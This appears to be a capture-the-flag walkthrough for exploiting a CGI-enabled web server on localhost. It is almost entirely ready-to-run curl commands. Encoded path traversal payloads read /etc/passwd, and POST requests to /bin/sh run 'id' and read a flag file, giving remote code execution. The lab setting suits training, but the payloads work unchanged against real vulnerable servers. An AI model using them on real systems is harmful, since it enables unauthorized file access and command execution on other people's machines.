🌐 2. Basic sanity checks

Open in browser:

http://localhost/

Check:

index.html loads ✅
/cgi-bin/healthcheck.sh works:
curl http://localhost/cgi-bin/healthcheck.sh

If this works → CGI execution is enabled ✅

🔍 3. Confirm traversal is possible

Test a harmless traversal first:

curl http://localhost/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
Expected:
If vulnerable → you’ll see /etc/passwd
If not → 403 / 404

👉 If this fails, try variants:

curl http://localhost/cgi-bin/..%2f..%2f..%2f..%2fetc/passwd
curl http://localhost/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
⚡ 4. Confirm RCE (critical step)

Now test execution via /bin/sh:

curl -X POST "http://localhost/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
-d 'echo Content-Type: text/plain; echo; id'
Expected output:
uid=... gid=...

👉 If you see that → 💥 RCE confirmed

📁 5. Read the flag

Now test the actual goal:

curl -X POST "http://localhost/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
-d 'echo Content-Type: text/plain; echo; cat /opt/internal_backup/flag.txt'
Expected:
FLAG{...}